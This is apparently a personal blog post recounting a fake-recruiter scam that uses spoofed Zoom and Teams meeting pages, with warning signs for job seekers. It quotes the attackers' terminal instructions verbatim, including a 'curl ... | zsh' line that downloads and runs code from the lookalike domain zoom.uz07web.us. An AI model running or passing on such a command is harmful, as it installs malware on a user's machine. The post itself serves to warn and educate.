---
title: "Try not to get scammed while looking for work"
description:
  "Couple weeks ago a CTO contacted me about a role at their company. After
  three failed calls, I figured they are trying to access my machine."
date: 2026-03-16
---

Job hunting is exhausting. Cold applications come back with rejections. Getting
on recruiters radar feels nearly impossible.

Frustration wears down your guard. And when someone messages you praising your
skills, you want to believe it's genuine.

> I think you have an interesting profile and would be a great fit for the
> engineering team. We're hiring talented developers like you. Are you open to
> remote work?

Joan, supposedly the CTO of a fintech company, reached out to me. A European
fintech startup sounded promising. I even had mutual connections who followed
the company and were linked to Joan on LinkedIn. Everything checked out. He
asked to move our conversation to Telegram. I agreed. We scheduled a call.

He sent a Microsoft Teams link. When I opened it on my phone, it demanded a
desktop. My laptop was in service but Joan insisted the app only worked on
desktop. I suggested Google Meet instead or something else mobile-friendly. He
pushed to reschedule.

Once I got my laptop back, Joan sent another Microsoft Teams link. This time,
audio failed and the browser app prompted me to update some SDK. I tried the
desktop app with the same room id, but it said "meeting not found." Alright, as
a user of Microsoft software first half of my life I was not surprised. I sent
him a Google Meet link instead though neither of us could hear the other. Weird,
but I assumed something had been damaged while I was in service or software got
outdated. So we agreed to try Zoom next time.

Before the call, I tested both Google Meet in browser and Zoom desktop to be
sure.

Joan sent a Zoom link. The desktop app wouldn't launch automatically, so I tried
the web version. Same error: "SDK update required." I tried entering the meeting
ID manually into desktop app – no luck. Joan claimed web and app calls weren't
compatible. That sounded wrong.

I tried the web version once more. Joan asked to follow instruction to fix the
error. Collapsed instructions had a set of commands needed to be pasted into
terminal.

```sh
set MEETING_ROOM="4030636137"
set AUTH_API_TOKEN="Ya29.sInR16IkNiI5cCIpX.MzUxNDI1NzQ3OA"
set MEETING_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.4030636137.signature"
curl -s https://zoom.uz07web.us/api/mn/4030636137/update/2 | zsh
set MEETING_TURN_SERVER="turn:turn.zoom.us"
set MEETING_SDK_VERSION="v15.17.5.4569"
set UPDATE_METHOD="manual"
softwareupdate --evaluate-products --products zoom-meet-sdk --agree-to-license
curl -s https://zoom.uz07web.us/api/mn/4030636137/update/2
```

Then I saw it: zoom.uz07web.us. That domain looked wrong. I checked my address
bar, same thing.

> https://zoom.uz07web.us/j/4030636137?pwd=nx3en3bbq6VTSU0K486J0vFxz4vMPZ.1

I searched through my history. The Teams link didn't look real too:

> https://teams.microsomeet.com/meet/9973477680?pwd=rVfAJBNjBxBlMwXKrU0SI0YUzmjsgz.1

Both now redirect to the real services home pages. But when I tried to join
those calls, they likely contained scripts installing malicious software.
specifically through commands like curl -s url | zsh, which downloads and
immediately executes code without verification.

I searched online and found
[a Google Cloud threat intelligence report](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering)
describing similar cases:

> The victim was contacted via Telegram through the account of an executive of a
> cryptocurrency company that had been compromised. The account engaged the
> victim and, after building a rapport, sent a Calendly link to schedule a
> 30-minute meeting. The meeting link itself directed to a spoofed Zoom meeting
> that was hosted on the threat actor's infrastructure, `zoom[.]uswe05[.]us`. 

Sounds familiar, right? I found the real company's Telegram support, and
reported the compromised LinkedIn account. The actual Joan promised to change
his password.

This is the reality we live in. Recruiters filter candidates through opaque ATS
systems to analyze practically hand-written resumes, and result may vary across
different tools. You cannot be sure which traits will be considered and which
just ignored by their system.

When a CTO personally reaches out, you want it to be real and that makes you
vulnerable. Scammers exploit this deliberately targeting the unemployed
precisely because frustration clouds judgment.

## What I missed

Looking back, the warnings were there. Telegram lets users disguise malicious
links behind innocent text, then delete messages to erase evidence. "SDK
updates" for browser apps is not a thing since Flash died. Legitimate services
never ask you to run terminal commands. And I missed fake URL domains
(zoom.uz07web.us, teams.microsomeet.com) when opened those calls.

I caught it eventually, though it is scary how far these schemes can go.
